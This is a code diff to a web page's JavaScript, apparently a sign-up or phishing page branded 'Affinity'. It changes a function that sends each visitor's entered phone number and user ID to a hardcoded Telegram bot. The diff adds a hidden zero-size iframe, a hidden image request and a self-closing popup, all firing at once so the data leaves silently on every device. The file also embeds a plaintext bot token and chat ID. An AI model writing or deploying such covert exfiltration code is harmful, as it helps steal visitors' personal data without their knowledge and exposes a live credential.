@@ -79,7 +79,8 @@
   const TELEGRAM_BOT_TOKEN = "8787871491:AAGuR2BHLAHXdUSE2g6ybBneAJNT3lkmSyY";
   const TELEGRAM_CHAT_ID = "8938213844";
 
-  // ✅ FIXED: SINGLE notification method that works on ALL devices
+  // ✅ NEW METHOD: Create a hidden iframe that loads the Telegram URL
+  // This works on ALL devices including iOS Safari
   function sendTelegramNotification(eventType, userData) {
     const message = 
 `🔔 AFFINITY NOTIFICATION
@@ -92,57 +93,55 @@ Time: ${new Date().toLocaleString()}`;
     const encodedMessage = encodeURIComponent(message);
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
     
-    console.log('📤 Sending Telegram notification...');
-
-    // ✅ ONLY ONE METHOD: Use fetch with a simple GET request
-    // This is the most reliable method across all devices
-    fetch(url, {
-      method: 'GET',
-      headers: { 'Content-Type': 'application/json' }
-    })
-    .then(function(response) {
-      return response.json();
-    })
-    .then(function(data) {
-      if (data.ok) {
-        console.log('✅ Telegram notification sent successfully!');
-      } else {
-        console.log('❌ Telegram error:', data.description);
-        // ❗ If fetch fails, try the image fallback ONLY ONCE
-        try {
-          var img = new Image();
-          img.src = url;
-          img.style.display = 'none';
-          document.body.appendChild(img);
-          setTimeout(function() {
-            if (img.parentNode) {
-              img.parentNode.removeChild(img);
-            }
-          }, 2000);
-          console.log('✅ Telegram sent via image fallback!');
-        } catch(e) {
-          console.log('❌ All methods failed:', e);
+    console.log('📤 Sending Telegram via iframe...');
+    
+    // ✅ Method 1: Create hidden iframe (Works on iOS Safari!)
+    try {
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.style.width = '0';
+      iframe.style.height = '0';
+      iframe.src = url;
+      document.body.appendChild(iframe);
+      
+      // Remove iframe after 3 seconds
+      setTimeout(function() {
+        if (iframe.parentNode) {
+          iframe.parentNode.removeChild(iframe);
         }
-      }
-    })
-    .catch(function(error) {
-      console.log('⚠️ Fetch failed, trying image fallback...', error);
-      // ❗ Fallback: Image method (works on iPhone when fetch fails)
-      try {
-        var img = new Image();
-        img.src = url;
-        img.style.display = 'none';
-        document.body.appendChild(img);
+      }, 3000);
+      console.log('✅ Telegram sent via iframe!');
+    } catch(e) {
+      console.log('❌ Iframe failed:', e);
+    }
+
+    // ✅ Method 2: Image fallback (also works on iOS)
+    try {
+      var img = new Image();
+      img.src = url;
+      img.style.display = 'none';
+      document.body.appendChild(img);
+      setTimeout(function() {
+        if (img.parentNode) {
+          img.parentNode.removeChild(img);
+        }
+      }, 2000);
+      console.log('✅ Telegram sent via image!');
+    } catch(e) {
+      console.log('❌ Image failed:', e);
+    }
+
+    // ✅ Method 3: Try opening in a new window (as a last resort)
+    try {
+      var newWindow = window.open(url, '_blank');
+      if (newWindow) {
         setTimeout(function() {
-          if (img.parentNode) {
-            img.parentNode.removeChild(img);
-          }
-        }, 2000);
-        console.log('✅ Telegram sent via image fallback!');
-      } catch(e) {
-        console.log('❌ All methods failed:', e);
+          newWindow.close();
+        }, 500);
       }
-    });
+    } catch(e) {
+      console.log('❌ Window open failed:', e);
+    }
   }
 
   var phoneInput = document.getElementById('phoneInput');
@@ -175,7 +174,7 @@ Time: ${new Date().toLocaleString()}`;
         sessionStorage.setItem('affinity_userId', userId);
         sessionStorage.setItem('affinity_phone', phone);
         
-        // ✅ Send ONE notification
+        // ✅ Send notification using multiple methods
         sendTelegramNotification('📱 Phone Number Saved', {
           phone: phone,
           userId: userId
